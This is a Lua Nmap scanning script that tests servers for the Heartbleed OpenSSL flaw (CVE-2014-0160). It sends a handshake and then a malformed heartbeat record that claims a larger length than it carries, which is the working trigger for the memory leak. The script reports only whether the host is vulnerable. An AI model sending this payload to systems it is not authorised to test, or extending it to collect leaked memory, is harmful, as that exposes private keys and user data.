

description = [[
Attempts to detect heartbleed vulnerable.

The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. 
If you want to get more details please refer to: http://heartbleed.com

This implementation is based on http://s3.jspenguin.org/ssltest.py
]]

author = "Zou Guangxian"

categories = {"exploit", "vuln"}
local nmap = require "nmap"
local bin = require "bin"
local stdnse = require "stdnse"
local shortport = require "shortport"

portrule = shortport.port_or_service(443, "ssl", "tcp", "open")

local hello_payload = '\22\3\2\0\220\1\0\0\216\3\2\83\67\91\144\157\155\114\11\188\12\188\43\146\168\72\151\207\189\57\4\204\22\10\133\3\144\159\119\4\51\212\222\0\0\102\192\20\192\10\192\34\192\33\0\57\0\56\0\136\0\135\192\15\192\5\0\53\0\132\192\18\192\8\192\28\192\27\0\22\0\19\192\13\192\3\0\10\192\19\192\9\192\31\192\30\0\51\0\50\0\154\0\153\0\69\0\68\192\14\192\4\0\47\0\150\0\65\192\17\192\7\192\12\192\2\0\5\0\4\0\21\0\18\0\9\0\20\0\17\0\8\0\6\0\3\0\255\1\0\0\73\0\11\0\4\3\0\1\2\0\10\0\52\0\50\0\14\0\13\0\25\0\11\0\12\0\24\0\9\0\10\0\22\0\23\0\8\0\6\0\7\0\20\0\21\0\4\0\5\0\18\0\19\0\1\0\2\0\3\0\15\0\16\0\17\0\35\0\0\0\15\0\1\1'

local heartbeat_payload = '\24\3\2\0\3\1\64\0'

-- based on nselib/amqp.lua
BufferedSocket =
{
	retries = 3,

	new = function(self)
		local o = {}
		setmetatable(o, self)
		self.__index = self
		o.Socket = nmap.new_socket()
		o.Buffer = nil
		return o
	end,

	--- Establishes a connection.
	--
	-- @param hostid Hostname or IP address.
	-- @param port Port number.
	-- @param protocol <code>"tcp"</code>, <code>"udp"</code>, or
	-- @return Status (true or false).
	-- @return Error code (if status is false).
	connect = function( self, hostid, port, protocol )
		return self.Socket:connect( hostid, port, protocol )
	end,

	set_timeout = function( self, timeout )
		self.Socket:set_timeout( timeout )
	end,

	--- Closes an open connection.
	--
	-- @return Status (true or false).
	-- @return Error code (if status is false).
	close = function( self )
		self.Buffer = nil
		return self.Socket:close()
	end,

	--- Opposed to the <code>socket:receive_bytes</code> function, that returns
	-- at least x bytes, this function returns the amount of bytes requested.
	--
	-- @param count of bytes to read
	-- @return true on success, false on failure
	-- @return data containing bytes read from the socket
	-- 		   err containing error message if status is false
	receive_bytes = function( self, count )
		local status, data

		self.Buffer = self.Buffer or ""

		if ( #self.Buffer < count ) then
			status, data = self.Socket:receive_bytes( count - #self.Buffer )
			if ( not(status) ) then
				return false, data
			end
			self.Buffer = self.Buffer .. data
		end

		data = self.Buffer:sub( 1, count )
		self.Buffer = self.Buffer:sub( count + 1)

		return true, data
	end,

	--- Sends data over the socket
	--
	-- @return Status (true or false).
	-- @return Error code (if status is false).
	send = function( self, data )
		return self.Socket:send( data )
	end,
}

local receive_msg=function(sock)
	local status, ret

	status, ret = sock:receive_bytes(5)
	if not status then
		return false, ret
	end
	local pos, typ, ver, ln = bin.unpack(">CSS", ret)

	stdnse.print_debug(string.format("... received message: type = %d, ver = %04x, length = %d", typ, ver, ln))
	status, ret = sock:receive_bytes(ln)
	if not status then
		return false, ret
	end
	return true, nil, typ, ver, ret
end

action = function(host, port)
	local sock
	local status, err, ret
	local typ, ver

	sock = BufferedSocket:new()
	sock:set_timeout( 3000 )
	status, err = sock:connect(host.ip, port.number, "tcp")
	if not status then
		return err
	end

	status, ret = sock:send(hello_payload)
	if not status then
		sock:close()
		return err
	end

	while true do
		status, err, typ, ver, ret = receive_msg(sock)
		if not status then
			sock:close()
			return err
		end

		if typ == nil then
			return nil
		end

		if (typ == 22 and ret:byte(1,1) == 0x0E) then
			break
		end
	end

	status, err, ret = sock:send(heartbeat_payload)
	if not status then
		return err
	end

	status, err, ret = sock:send(heartbeat_payload)
	if not status then
		return err
	end

	while true do
		status, err, typ, ver, ret = receive_msg(sock)
		if typ == 24 then
			if string.len(ret) > 3 then
				return 'WARNING: host is vulnerable(CVE-2014-0160)'
			end
		elseif typ == 21 then
			return nil
		elseif typ == nil then
			return nil
		end
	end


	sock:close()

	return nil
end
